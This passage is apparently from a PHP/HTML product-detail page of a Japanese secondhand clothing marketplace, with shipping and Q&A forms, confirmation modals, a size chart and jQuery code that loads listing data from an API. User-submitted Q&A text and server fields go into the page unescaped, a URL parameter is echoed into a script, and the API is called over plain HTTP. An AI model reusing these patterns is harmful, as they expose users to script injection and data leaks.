                                                            </div>
                                                            <div class="ec-single-qty" id="soldtext" style="display: none; margin-bottom:-80px;">
                                                                <h3 style="color: red;"><b>商品発送待ち</b></h3>
                                                            </div>

                                                            <div class="ec-single-qty" id="shiptext" style="display: none; margin-bottom:-80px;">
                                                                <h3 style="color: red;"><b>商品発送済み</b></h3>
                                                            </div>

                                                            <div class="ec-single-qty" id="buyerbtn" style="display: none;">
                                                                <div class="ec-single-cart ">
                                                                    <button id="buyerbtntxt" class="btn btn-primary common_btn" style="width: 110%;">注文キャンセル
                                                                    </button>
                                                                </div>
                                                            </div>
                                                            <div class="ec-single-qty" id="buyerbtn2" style="display: none;">
                                                                <div class="ec-single-cart ">
                                                                    <button class="btn btn-primary common_btn" id="buyerbtn2txt" style="width: 110%;">商品の受取を通知する
                                                                    </button>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <!--Single product content End -->
                                    <div class="ec-single-pro-tab" id="solddivid" style="display: none;">
                                        <div class="ec-single-pro-tab-wrapper">
                                            <div class="ec-single-pro-tab-nav" id="qnadiv">
                                                <ul class="nav nav-tabs">
                                                    <li class="nav-item">
                                                        <a class="nav-link active" data-bs-toggle="tab" data-bs-target="#ec-spt-nav-review" role="tablist">
                                                            商品の発送を通知する
                                                        </a>
                                                    </li>
                                                </ul>
                                            </div>

                                            <div class="tab-content  ec-single-pro-tab-content">


                                                <div id="ec-spt-nav-info" class="tab-pane fade">
                                                    <div class="ec-single-pro-tab-moreinfo">
                                                        ---
                                                    </div>
                                                </div>

                                                <div id="ec-spt-nav-review" class="tab-pane fade show active">
                                                    <div class="ec-register-wrapper">
                                                        <div class="ec-register-container">
                                                            <div class="ec-register-form">
                                                                <form action="" name="soldForm" id="soldForm" method="POST">
                                                                    <span class="ec-register-wrap ">
                                                                        <h5 id="shipmentinfo" style="display: none; color: #777 !important; font-weight:bold !important;">配送先情報</h5> <br>
                                                                    </span>
                                                                    <span class="ec-register-wrap ">
                                                                        <label id="unamelbl" style="display: none;  margin-top:-25px;">購入者氏名：<span id="uname"></span></label> <br />
                                                                        <label id="addresslbl" style="display: none; margin-top:-25px;">住所：<span id="address"></span></label> <br />
                                                                        <label id="contactlbl" style="display: none; margin-top:-25px;">電話番号：<span id="buyercontact"></label><br />
                                                                    </span>
                                                                    <span class="ec-register-wrap">
                                                                        <label><b>配送伝票番号</b></label>
                                                                        <input type="text" name="slipnumber" id="slipnumber" placeholder="ハイフン無し, 数字12桁" required maxlength="12" oninvalid="if(this.value==''){this.setCustomValidity('配送伝票番号を入力してください。')}else{
                                                            this.setCustomValidity('伝票番号は12桁で必要があります。')}" onchange="this.setCustomValidity('')" oninput="this.value = this.value.replace(/[^0-9]/g,'');" />
                                                                    </span>
                                                                    <span class="ec-register-wrap ">
                                                                        <label><b>配送業者</b></label>
                                                                        <div class="ec-rg-select-inner">
                                                                            <select name="your-email" id="carrier" class="ec-register-select" required oninvalid="this.setCustomValidity('運送業者を選択してください。')" onchange="optionChange()" autocomplete="off">

                                                                                <option value="ヤマト運輸" selected>ヤマト運輸</option>
                                                                                <option value="佐川急便">佐川急便</option>
                                                                                <option value="日本郵便">日本郵便</option>
                                                                            </select>
                                                                    </span>

                                                            </div>
                                                            </span>

                                                            <div class="ec-ratting-input form-submit">
                                                                <button class="btn btn-primary common_btn sendMail" id="cmn_btn" type="submit" value="Submit">送信</button>
                                                            </div>
                                                            </form>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <!-- Single product tab start -->
                                <div class="ec-single-pro-tab">
                                    <div class="ec-single-pro-tab-wrapper">
                                        <div class="ec-single-pro-tab-nav" id="qnadiv">
                                            <ul class="nav nav-tabs">
                                                <li class="nav-item">
                                                    <a class="nav-link active" id="qabtn" data-bs-toggle="tab" data-bs-target="#ec-spt-nav-review" role="tablist">
                                                        これまでのQ&A
                                                    </a>
                                                </li>
                                            </ul>
                                        </div>
                                        <div class="tab-content ec-single-pro-tab-content tab-scroll" id="option_div">
                                            <div id="ec-spt-nav-info" class="tab-pane fade">
                                                <div class="ec-single-pro-tab-moreinfo">
                                                    ---
                                                </div>
                                            </div>
                                            <div id="ec-spt-nav-review" class="tab-pane fade show active">
                                                <div class="row">
                                                    <div class="ec-ratting-content">
                                                        <div class="ec-ratting-form">
                                                            <form method="post">
                                                                <div id="qna">
                                                                </div>
                                                            </form>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <!-- product details description area end -->
                                <!-- Single product tab start -->
                                <?php //if (isset($_SESSION['Login']) && !empty($_SESSION['Login'])) { 
                                ?>
                                <div class="ec-single-pro-tab" id="normaldiv">
                                    <div class="ec-single-pro-tab-wrapper">
                                        <div class="ec-single-pro-tab-nav">
                                            <ul class="nav nav-tabs">
                                                <li class="nav-item">
                                                    <a class="nav-link active" id="qaFormDiv" data-bs-toggle="tab" data-bs-target="#ec-spt-nav-review" role="tablist">
                                                        Q&Aの質問を入力</a>
                                                </li>
                                            </ul>
                                        </div>
                                        <div class="tab-content ec-single-pro-tab-content" id="qa_form" style="display:none">
                                            <div id="ec-spt-nav-info" class="tab-pane fade">
                                                <div class="ec-single-pro-tab-moreinfo">
                                                    ---
                                                </div>
                                            </div>
                                            <div id="ec-spt-nav-review" class="tab-pane fade show active">
                                                <div class="row">
                                                    <div class="ec-ratting-content">
                                                        <div class="ec-ratting-form">
                                                            <span id="results">
                                                                <?php if ($e_msg != "") {
                                                                    echo $e_msg;
                                                                } ?>
                                                            </span>
                                                            <form method="POST" name="question" id="question">
                                                                <!-- <div class="ec-ratting-input">
                                                                        <input name="your-name" id="your-name" placeholder="名前" type="text" required oninvalid="this.setCustomValidity('名前を入力してください。')" onchange="this.setCustomValidity('')" />
                                                                    </div>
                                                                    <div class="ec-ratting-input">
                                                                        <input name="your-email" id="your-email" placeholder="Eメール" type="email" required oninvalid="this.setCustomValidity('Eメールを入力してください。')" onchange="this.setCustomValidity('')" />
                                                                    </div> -->
                                                                <div class="ec-ratting-input form-submit">
                                                                    <div id="Errmsg" style="display:none;">
                                                                        <label style="color:red; font-weight:bold;">ニックネームが登録されていません。<u><a href="user-profile.php" style="color:red; font-weight:bold;">プロフィール画面 </a></u>より登録後、Q&Aをご送信ください。<label>
                                                                    </div>
                                                                    <textarea name="your-commemt" id="your-commemt" placeholder="100文字までを入力してください" required maxlength="100" oninvalid="this.setCustomValidity('コメントを入力してください。')" onchange="this.setCustomValidity('')"></textarea>
                                                                    <?php if (!isset($_SESSION['Login']) && empty($_SESSION['Login'])) { ?>
                                                                        <button type="submit" class="btn btn-primary common_btn no_login_qa" id="cmn_btn" tabindex="14">送信</button>
                                                                    <?php
                                                                    } else { ?>
                                                                        <button type="submit" class="btn btn-primary common_btn sendquery" id="cmn_btn" data-toggle="modal" data-target="#modal_confirm" ; tabindex="14">送信</button><?php } ?>
                                                                </div>
                                                            </form>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <?php
                                //} 
                                ?>
                                <!-- product details description area end -->
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        </div>
    </section>
    <!-- End Single product -->

    <!-- Footer Start -->
    <div id="footer"></div>
    <!-- Footer Area End -->

    <!-- Cart Floating Button -->
    <div class="ec-cart-float">
        <a href="#ec-side-cart" class="ec-header-btn ec-side-toggle">
            <div class="header-icon">
                <img src="../assets/images/icons/cart.svg" class="svg_img header_svg" alt="" />
            </div>
            <span class="ec-cart-count cart-count-lable">3</span>
        </a>
    </div>
    <!-- Cart Floating Button end -->
    <div class="modal fade bd-example-modal-sm" id="myModal_register" tabindex="-1" role="dialog" aria-labelledby="myModal_registerTitle" aria-hidden="true">
        <div class="modal-dialog modal-sm modal-dialog-centered" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title w-100 text-center" id="myModal_registerTitle">
                        <b>商品サイズ</b>
                    </h5>
                </div>
                <div class="modal-body zoom-image-hover">
                    <b>
                        <center>
                            <img src="../assets/images2/common/karteafter.jpg" class="zoomImg" />
                        </center>
                    </b>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-primary" data-bs-dismiss="modal">
                        閉じる
                    </button>
                </div>
            </div>
        </div>
    </div>

    <!-- ZOOM MODAL  -->

    <div class="modal fade bd-example-modal-sm" id="myModal_register9" tabindex="-1" role="dialog" aria-labelledby="myModal_registerTitle" aria-hidden="true">
        <div class="modal-dialog modal-sm modal-dialog-centered" role="document">
            <div class="modal-content">
                <div class="finishmeasurementvaluefront1_1" id="modal1"></div>
                <div class="finishmeasurementvaluefront2_1" id="modal2"></div>
                <div class="finishmeasurementvaluefront3_1" id="modal3"></div>
                <div class="finishmeasurementvaluefront4_1" id="modal4"></div>
                <div class="finishmeasurementvaluefront5_1" id="modal5"></div>
                <div class="finishmeasurementvaluefront6_1" id="modal6"></div>
                <div class="finishmeasurementvaluefront9_1" id="modal9"></div>
                <div class="finishmeasurementvaluefront12_1" id="modal12"></div>
                <div class="finishmeasurementvaluefront10_1" id="modal10"></div>
                <div class="finishmeasurementvaluefront11_1" id="modal11"></div>
                <div class="finishmeasurementvaluefront8_1" id="modal8"></div>
                <div class="finishmeasurementvaluefront7_1" id="modal7"></div>
                <div class="finishmeasurementvaluefront13_1" id="modal13"></div>
                <div class="finishmeasurementvaluefront14_1" id="modal14"></div>
                <div class="finishmeasurementvalueback15_1" id="modal15"></div>
                <div class="finishmeasurementvalueback16_1" id="modal16"></div>
                <div class="finishmeasurementvalueback17_1" id="modal17"></div>
                <div class="finishmeasurementvalueback18_1" id="modal18"></div>
                <div class="finishmeasurementvalueback19_1" id="modal19"></div>
                <div class="finishmeasurementvalueback20_1" id="modal20"></div>
                <div class="finishmeasurementvalueback27_1" id="modal27"></div>
                <div class="finishmeasurementvalueback24_1" id="modal24"></div>
                <div class="finishmeasurementvalueback25_1" id="modal25"></div>
                <div class="finishmeasurementvalueback22_1" id="modal22"></div>
                <div class="finishmeasurementvalueback26_1" id="modal26"></div>
                <div class="finishmeasurementvalueback21_1" id="modal21"></div>
                <div class="finishmeasurementvalueback28_1" id="modal28"></div>
                <div class="finishmeasurementvalueback23_1" id="modal23"></div>
                <div class="finishmeasurementvaluefront29_1" id="modal29"></div>
                <div class="finishmeasurementvaluedoublewidth_1" id="modaldoublewidth"></div>
                <div class="modal-body" id="modal_img">
                    <img src="../assets/images2/common/karteafter.jpg" style="width:98%;height:100%;image-rendering:-webkit-optimize-contrast;">
                </div>
                <div class="modal-footer" style="justify-content:center!important;">
                    <a style="color:white;">
                        <button type="button" class="btn btn-primary zoom-close" data-bs-dismiss="modal" style="width:75px!important;">閉じる</button></a>
                </div>
            </div>
        </div>
    </div>

    <!-- confirm Modal  -->

    <div class="modal fade bd-example-modal-sm" id="modal_confirm1" tabindex="-1" role="dialog" aria-labelledby="myModal_registerTitle" aria-hidden="true">
        <div class="modal-dialog modal-sm modal-dialog-centered" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title w-100 text-center" id="myModal_registerTitle">
                        <b>商品詳細</b>
                    </h5>
                </div>
                <div class="modal-body" style="color:black;">
                    <center id="msgtxt">
                        <?php if ($msg != "") {
                            echo $msg;
                        } ?>
                    </center>
                </div>
                <div class="modal-footer" style="justify-content:center!important;">
                    <a style="color:white;">
                        <button class="btn btn-primary" data-bs-dismiss="modal" style="width:75px!important;" onClick="window.location.reload();">閉じる</button></a>
                </div>
            </div>
        </div>
    </div>

    <div class="modal fade bd-example-modal-sm" id="modal_confirm" tabindex="-1" role="dialog" aria-labelledby="myModal_registerTitle" aria-hidden="true">
        <div class="modal-dialog modal-sm modal-dialog-centered" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title w-100 text-center" id="myModal_registerTitle">
                        <b id="modalTitle">商品詳細</b>
                    </h5>
                </div>

                <div class="modal-body" style="color:black;font-size: 16px;">
                    <center id="modaltxt">商品公開をしてもよろしいですか？</center>
                </div>
                <div class="modal-footer" style="justify-content:center!important;">
                    <button type="button" class="btn btn-primary" id="confirm-button" data-bs-dismiss="modal" name="confirm-button" style="width:75px!important;" data-toggle="modal" data-target="#modal_confirm1">はい</button>
                    <a style="color:white;">
                        <button type="button" class="btn btn-primary" data-bs-dismiss="modal" style="width:75px!important;">いいえ</button></a>
                </div>
            </div>
        </div>
    </div>

    <div class="modal fade bd-example-modal-sm" id="cart_confirm" tabindex="-1" role="dialog" aria-labelledby="myModal_registerTitle" aria-hidden="true">
        <div class="modal-dialog modal-sm modal-dialog-centered" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title w-100 text-center" id="myModal_registerTitle">
                        <b id="modalTitle">商品詳細</b>
                    </h5>
                </div>

                <div class="modal-body" style="color:black;">
                    <center>商品はカートに入れてもよろしいですか？</center>
                </div>
                <div class="modal-footer" style="justify-content:center!important;">
                    <button type="button" class="btn btn-primary" id="cart-confirm-button" data-bs-dismiss="modal" name="confirm-button" style="width:75px!important;" data-toggle="modal" data-target="#modal_confirm1">はい</button>
                    <a style="color:white;">
                        <button type="button" class="btn btn-primary" data-bs-dismiss="modal" style="width:75px!important;">いいえ</button></a>
                </div>
            </div>
        </div>
    </div>


    <div class="modal fade bd-example-modal-sm" id="modal_currierconfirm" tabindex="-1" role="dialog" aria-labelledby="myModal_registerTitle" aria-hidden="true">
        <div class="modal-dialog modal-sm modal-dialog-centered" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title w-100 text-center" id="myModal_registerTitle">
                        <b id="modalTitle">商品詳細</b>
                    </h5>
                </div>

                <div class="modal-body" style="color:black;font-size: 16px;">
                    <center id="modaltxt">商品の発送を通知してもよろしいですか？</center>
                </div>
                <div class="modal-footer" style="justify-content:center!important;">
                    <button type="button" class="btn btn-primary" id="currier-confirm-button" data-bs-dismiss="modal" name="confirm-button" style="width:75px!important;" data-toggle="modal" data-target="#modal_confirm1">はい</button>
                    <a style="color:white;">
                        <button type="button" class="btn btn-primary" data-bs-dismiss="modal" style="width:75px!important;">いいえ</button></a>
                </div>
            </div>
        </div>
    </div>


    <div class="modal fade bd-example-modal-sm" id="modal_recivedconfirm" tabindex="-1" role="dialog" aria-labelledby="myModal_registerTitle" aria-hidden="true">
        <div class="modal-dialog modal-sm modal-dialog-centered" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title w-100 text-center" id="myModal_registerTitle">
                        <b id="modalTitle">商品詳細</b>
                    </h5>
                </div>

                <div class="modal-body" style="color:black;font-size: 16px;">
                    <center id="modaltxt">商品の受取を通知してもよろしいですか？</center>
                </div>
                <div class="modal-footer" style="justify-content:center!important;">
                    <button type="button" class="btn btn-primary" id="reciveproductbtn" data-bs-dismiss="modal" name="reciveproductbtn" style="width:75px!important;" data-toggle="modal" data-target="#modal_confirm1">はい</button>
                    <a style="color:white;">
                        <button type="button" class="btn btn-primary" data-bs-dismiss="modal" style="width:75px!important;">いいえ</button></a>
                </div>
            </div>
        </div>
    </div>

    <!-- Waiting modal -->
    <div class="modal fade bd-example-modal-sm" id="process" tabindex="-1" role="dialog" aria-labelledby="myModal_registerTitle" aria-hidden="true">
        <div class="modal-dialog modal-sm modal-dialog-centered " role="document">
            <div class="modal-content">
                <div class="modal-body" style="color: black;">
                    <center>処理中です。しばらくお待ちください。</center>
                </div>
            </div>
        </div>
    </div>
    <!-- Modal end -->

    <!-- product condition modal -->
    <div class="modal fade bd-example-modal-sm" id="myModal_register5" tabindex="-1" role="dialog" aria-labelledby="myModal_registerTitle" aria-hidden="true">
        <div class="modal-dialog modal-sm modal-dialog-centered " role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title w-100 text-center" id="myModal_registerTitle" style="color: black;"><b>状態表示について</b></h5>
                </div>
                <div class="modal-body " style="color: black;">

                   <center><p style = "color:red;">当社ハッピーが評価したケアメンテ直後の状態です</p></center>
                   <center><p style = "color:red;">状態の目安としてご活用ください</p></center>
                    <br/>
                    <div class="row " style="margin-top: 10px;">
                        <div class="col-md-12 size-table-detail">
                            <table style="width:100%">
                                <tr>
                                    <th>商品の状態（ケアメンテ後）</th>
                                    <th>状態の目安</th>

                                </tr>
                                <tr>
                                    <td>非常に良い</td>
                                    <td style = "text-align:left !important;">ダメージ（傷・汚れ等）がほとんど見当たらず、新品同様で非常に良い状態。</td>
                                </tr>
                                <tr>
                                    <td>良い</td>
                                    <td style = "text-align:left !important;">よく見ないとわからない程度のダメージ（傷・汚れ等）があるものの、中古としては良い状態。</td>
                                </tr>
                                <tr>
                                    <td>可</td>
                                    <td style = "text-align:left !important;">多少のダメージ（傷・汚れ等）があるものの、着用・使用は可能な状態。</td>
                                </tr>
                                <tr>
                                    <td>難あり</td>
                                    <td style = "text-align:left !important;">目立つダメージ（傷・汚れ等）があるため、着用・使用に困難な場合がある状態。</td>
                                </tr>

                            </table>
                        </div>
                        <div class="modal-footer" style="justify-content: center !important;">
                            <button type="button" class="btn btn-primary" data-bs-dismiss="modal" style="width: 75px !important;" id="yes">閉じる</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div> 
    <!-- product condition modal End -->



      <!-- size modal  -->
      <div class="modal fade bd-example-modal-sm" id="myModal_dimension" tabindex="-1" role="dialog"
        aria-labelledby="myModal_registerTitle" aria-hidden="true">
        <div class="modal-dialog modal-sm modal-dialog-centered " role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title w-100 text-center" id="myModal_registerTitle"><b>寸法表について</b></h5>
                    <!-- <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                            <span aria-hidden="true">&times;</span>
                        </button>   -->
                </div>
                <div class="modal-body size-detail" style="color: black;">
                    <center> *単位は「cm」です。</center>
                    <center>*ケアメンテ後の実寸値です。 </center>
                    <br />

                    <div class="row ">

                        <div class="col-md-6 size-table-detail">
                            <ul class="list-group">
                                <li class="list-group-item">1＝首まわり</li>
                                <li class="list-group-item">2＝片肩巾</li>
                                <li class="list-group-item">3＝袖丈</li>
                                <li class="list-group-item">4＝前身巾</li>
                                <li class="list-group-item">5＝前中央丈</li>
                                <li class="list-group-item">6＝前裾巾または前ウエスト巾</li>
                                <li class="list-group-item">7＝袖下丈</li>
                                <li class="list-group-item">8＝脇前文</li>
                                <li class="list-group-item">9＝スカート前中央丈</li>
                                <li class="list-group-item">10＝ズボン丈</li>
                                <li class="list-group-item">11＝ズボン股下丈</li>
                                <li class="list-group-item">12＝スカート．コート　ワンピースの前裾巾</li>
                                <li class="list-group-item">13＝ズボン裾巾</li>
                                <li class="list-group-item">14＝袖口巾</li>
                                <li class="list-group-item">15＝タートルネック巾</li>

                            </ul>
                        </div>
                        <div class="col-md-6 size-table-detail">
                            <ul class="list-group">
                                <li class="list-group-item">16＝タートルネック丈</li>
                                <li class="list-group-item">17＝両肩巾</li>
                                <li class="list-group-item">18＝後身巾</li>
                                <li class="list-group-item">19＝後中央丈</li>
                                <li class="list-group-item">20＝後裾巾または後ウエスト巾</li>
                                <li class="list-group-item">21＝脇後丈</li>
                                <li class="list-group-item">22＝スカート左脇丈</li>
                                <li class="list-group-item">23＝スカート右脇丈</li>
                                <li class="list-group-item">24＝スカート後中央丈</li>
                                <li class="list-group-item">25＝スカート・コート・ワンピースの後裾巾</li>
                                <li class="list-group-item">26＝パンツ巾</li>
                                <li class="list-group-item">27＝ヒップ巾</li>
                                <li class="list-group-item">28＝ズボン太腿巾</li>
                                <li class="list-group-item">29＝腕巾</li>
                                <li class="list-group-item">&nbsp;</li>
                            </ul>
                        </div>
                    </div>


                    <center>ダブル巾＝ズボン裾の折り返し巾</center>
                </div>
                <div class="modal-footer " style="justify-content: center !important;   ">
                    <!-- <a href="list-maintenance.php " style="color: white; "> <button type="button " class="btn btn-primary " data-bs-dismiss="modal " style="width: 75px !important; ">はい</button></a> -->
                    <a style="color: white;"> <button type="button" class="btn btn-primary" data-bs-dismiss="modal"
                            style="width: 130px !important;">閉じる</button></a>

                </div>
            </div>
        </div>
    </div>

    <!-- Vendor JS -->

    <script src="../assets/js/vendor/jquery-3.5.1.min.js"></script>
    <script src="../assets/js/vendor/popper.min.js"></script>
    <script src="../assets/js/vendor/bootstrap.min.js"></script>
    <script src="../assets/js/vendor/jquery-migrate-3.3.0.min.js"></script>
    <script src="../assets/js/vendor/modernizr-3.11.2.min.js"></script>
    <!--Plugins JS-->
    <script src="../assets/js/plugins/swiper-bundle.min.js"></script>
    <script src="../assets/js/plugins/countdownTimer.min.js"></script>
    <script src="../assets/js/plugins/scrollup.js"></script>
    <script src="../assets/js/plugins/jquery.zoom.min.js"></script>
    <script src="../assets/js/plugins/slick.min.js"></script>
    <script src="../assets/js/plugins/infiniteslidev2.js"></script>
    <script src="../assets/js/vendor/jquery.magnific-popup.min.js"></script>
    <script src="../assets/js/plugins/jquery.sticky-sidebar.js"></script>
    <!-- Main Js -->
    <script src="../assets/js/vendor/index.js"></script>
    <script src="../assets/js/main.js"></script>
    <script type="text/javascript">
        $('.sendquery').click(function() {
            var commemt = $('#your-commemt').val();
            // console.log(commemt);
            var unickname = "<?php echo $unickname ?>";
            if (commemt != '' && unickname == '') {
                $('#Errmsg').css('display', 'block');
                return false;
            }
        });
    </script>
    <script type="text/javascript">
        $("#header").load("header-new.php");
        $("#footer").load("footer-new.php");

        $("#sidebar_content").load("common_sidebar-new.php");
    </script>
    <script>
        var chart_no = "";
        var thing_no = "";
        var lineno = "";
        var registerno = "";
        var nickname = "";
        var selleremail = "";
        var buyeremail = "";
    </script>
    <script>
        $(function() {
            $(document).ready(function() {
                $('#process').modal('show'); 
                $.ajax({
                    type: 'post',
                    url: 'http://141.147.145.177:8081/shpml-web/saifuru/view/productdetailsinfo',
                    contentType: "application/json;charset=UTF-8",
                    data: '<?php echo json_encode(array("registerno" => $_GET["regno"], "visitorno" => isset($_SESSION["Login"]) && !empty($_SESSION["Login"]) ? $_SESSION["Visitor_no"] : "")); ?>',
                    success: function(resdata) {
                        // console.log("success", resdata);
                        document.getElementById('prodName').innerHTML = resdata.ENTITY_LIST[0]
                            .brand + " " + resdata.ENTITY_LIST[0].classificationname;
                        document.getElementById('sellingPrice').innerHTML = "¥" + resdata
                            .ENTITY_LIST[0].price + "<span id='pricetxthtml'> (税込)</span>";
                        document.getElementById('classificationName').innerHTML = " " + resdata
                            .ENTITY_LIST[0].classificationname;
                        document.getElementById('brand').innerHTML = " " + resdata.ENTITY_LIST[
                            0].brand;

                        if (resdata.ENTITY_LIST[0].material == null) {
                            document.getElementById('material').innerHTML = " ";
                        } else {
                            document.getElementById('material').innerHTML = " " + resdata
                                .ENTITY_LIST[0].material;
                        }

                        if (resdata.ENTITY_LIST[0].lining == null) {
                            document.getElementById('lining').innerHTML = " ";
                        } else {
                            document.getElementById('lining').innerHTML = " " + resdata
                                .ENTITY_LIST[0].lining;
                        }

                        document.getElementById('size').innerHTML = " " + resdata.ENTITY_LIST[0]
                            .size;
                        document.getElementById('condition').innerHTML = " " + resdata
                            .ENTITY_LIST[0].productCondition;
                        document.getElementById('prodDetail').innerHTML = " " + resdata
                            .ENTITY_LIST[0].productdetails;
                        document.getElementById('color').innerHTML = " " + resdata.ENTITY_LIST[
                            0].color;
                        document.getElementById('address').innerHTML = "〒 " + resdata
                            .ENTITY_LIST[0].address;
                        document.getElementById('prodDesc').innerHTML = " " + resdata
                            .ENTITY_LIST[0].apilpoint;
                        document.getElementById('userNickname').innerHTML = " " + resdata
                            .ENTITY_LIST[0].sellernickname;
                        document.getElementById('uname').innerHTML = " " + resdata.ENTITY_LIST[
                            0].name;
                        document.getElementById('buyercontact').innerHTML = " " + resdata.ENTITY_LIST[
                            0].buyertelephone;
                        document.getElementById('category').innerHTML = " " + resdata
                            .ENTITY_LIST[0].category;
                        document.getElementById('shipmentSource').innerHTML = " " + resdata
                            .ENTITY_LIST[0].deliverycategory == 1 ? " 出品者" : " Happyケアメンテ（京都）";
                        if(resdata.ENTITY_LIST[0].coverimage==""){
                              document.getElementById("dataimg").src =
                        "<?php echo "https://kh01.kyoto-happy.co.jp/netkuroku/saifuru_test/no_image.png" ?>" ;
                        }
                        else{ 
                             document.getElementById("dataimg").src =
                        "<?php echo "https://kh01.kyoto-happy.co.jp/netkuroku/saifuru_test/"; ?>" + resdata
                        .ENTITY_LIST[0].coverimage;
                        }

                        chart_no = resdata.ENTITY_LIST[0].chartno;
                        thing_no = resdata.ENTITY_LIST[0].thingno;
                        lineno = resdata.ENTITY_LIST[0].lineno;
                        registerno = resdata.ENTITY_LIST[0].registerno;
                        nickname = resdata.ENTITY_LIST[0].sellernickname;
                        selleremail = resdata.ENTITY_LIST[0].selleremail;
                        buyeremail = resdata.ENTITY_LIST[0].buyeremail;
                        buyername = resdata.ENTITY_LIST[0].name;
                        sellernum = resdata.ENTITY_LIST[0].sellerno;

                        var supercarObject = resdata.QUESTION_LIST;
                        $.each(supercarObject, function(key, value) {
                            if (value.answer == "" || value.answer == null) {
                                $("#qna").append("質問 " + ": " + value.question +
                                    '<br>' + "答え: " + "回答待ち" + '' + '<br>');
                            } else {
                                $("#qna").append("質問 " + ": " + value.question +
                                    '<br>' + "答え: " + value.answer + '' + '<br>');
                            }

                        });
                        // document.getElementById('imageDiv').innerHTML = '<img width="100" height="100" src="https://kh01.kyoto-happy.co.jp/netkuroku/saifuru_test/' + resdata.ENTITY_LIST[0].coverimage+ '">';

                        document.getElementById('1').innerHTML = resdata.ENTITY_LIST[0]
                            .finishmeasurementvaluefront1;
                        document.getElementById('2').innerHTML = resdata.ENTITY_LIST[0]
                            .finishmeasurementvaluefront2;
                        document.getElementById('3').innerHTML = resdata.ENTITY_LIST[0]
                            .finishmeasurementvaluefront3;
                        document.getElementById('4').innerHTML = resdata.ENTITY_LIST[0]
                            .finishmeasurementvaluefront4;
                        document.getElementById('5').innerHTML = resdata.ENTITY_LIST[0]
                            .finishmeasurementvaluefront5;
                        document.getElementById('6').innerHTML = resdata.ENTITY_LIST[0]
                            .finishmeasurementvaluefront6;
                        document.getElementById('7').innerHTML = resdata.ENTITY_LIST[0]
                            .finishmeasurementvaluefront7;
                        document.getElementById('8').innerHTML = resdata.ENTITY_LIST[0]
                            .finishmeasurementvaluefront8;
                        document.getElementById('9').innerHTML = resdata.ENTITY_LIST[0]
                            .finishmeasurementvaluefront9;
                        document.getElementById('10').innerHTML = resdata.ENTITY_LIST[0]
                            .finishmeasurementvaluefront10;
                        document.getElementById('11').innerHTML = resdata.ENTITY_LIST[0]
                            .finishmeasurementvaluefront11;
                        document.getElementById('12').innerHTML = resdata.ENTITY_LIST[0]
                            .finishmeasurementvaluefront12;
                        document.getElementById('13').innerHTML = resdata.ENTITY_LIST[0]
                            .finishmeasurementvaluefront13;
                        document.getElementById('14').innerHTML = resdata.ENTITY_LIST[0]
                            .finishmeasurementvaluefront14;

                        document.getElementById('15').innerHTML = resdata.ENTITY_LIST[0]
                            .finishmeasurementvalueback1;
                        document.getElementById('16').innerHTML = resdata.ENTITY_LIST[0]
                            .finishmeasurementvalueback2;
                        document.getElementById('17').innerHTML = resdata.ENTITY_LIST[0]
                            .finishmeasurementvalueback12;
                        document.getElementById('18').innerHTML = resdata.ENTITY_LIST[0]
                            .finishmeasurementvalueback3;
                        document.getElementById('19').innerHTML = resdata.ENTITY_LIST[0]
                            .finishmeasurementvalueback4;
                        document.getElementById('20').innerHTML = resdata.ENTITY_LIST[0]
                            .finishmeasurementvalueback5;
                        document.getElementById('21').innerHTML = resdata.ENTITY_LIST[0]
                            .finishmeasurementvalueback6;
                        document.getElementById('22').innerHTML = resdata.ENTITY_LIST[0]
                            .finishmeasurementvalueback7;
                        document.getElementById('23').innerHTML = resdata.ENTITY_LIST[0]
                            .finishmeasurementvalueback8;
                        document.getElementById('24').innerHTML = resdata.ENTITY_LIST[0]
                            .finishmeasurementvalueback9;
                        document.getElementById('25').innerHTML = resdata.ENTITY_LIST[0]
                            .finishmeasurementvalueback10;
                        document.getElementById('26').innerHTML = resdata.ENTITY_LIST[0]
                            .finishmeasurementvalueback11;
                        document.getElementById('27').innerHTML = resdata.ENTITY_LIST[0]
                            .finishmeasurementvalueback13;
                        document.getElementById('28').innerHTML = resdata.ENTITY_LIST[0]
                            .finishmeasurementvalueback14;
                        document.getElementById('29').innerHTML = resdata.ENTITY_LIST[0]
                            .finishmeasurementvaluefront15;
                        document.getElementById('doublewidth').innerHTML = resdata.ENTITY_LIST[0]
                           .finishmeasurementvalueback15;
                        $('#modal1').html(resdata.ENTITY_LIST[0].finishmeasurementvaluefront1);
                        $('#modal2').html(resdata.ENTITY_LIST[0].finishmeasurementvaluefront2);
                        $('#modal3').html(resdata.ENTITY_LIST[0].finishmeasurementvaluefront3);
                        $('#modal4').html(resdata.ENTITY_LIST[0].finishmeasurementvaluefront4);
                        $('#modal5').html(resdata.ENTITY_LIST[0].finishmeasurementvaluefront5);
                        $('#modal6').html(resdata.ENTITY_LIST[0].finishmeasurementvaluefront6);
                        $('#modal7').html(resdata.ENTITY_LIST[0].finishmeasurementvaluefront7);
                        $('#modal8').html(resdata.ENTITY_LIST[0].finishmeasurementvaluefront8);
                        $('#modal9').html(resdata.ENTITY_LIST[0].finishmeasurementvaluefront9);
                        $('#modal10').html(resdata.ENTITY_LIST[0]
                            .finishmeasurementvaluefront10);
                        $('#modal11').html(resdata.ENTITY_LIST[0]
                            .finishmeasurementvaluefront11);
                        $('#modal12').html(resdata.ENTITY_LIST[0]
                            .finishmeasurementvaluefront12);
                        $('#modal13').html(resdata.ENTITY_LIST[0]
                            .finishmeasurementvaluefront13);
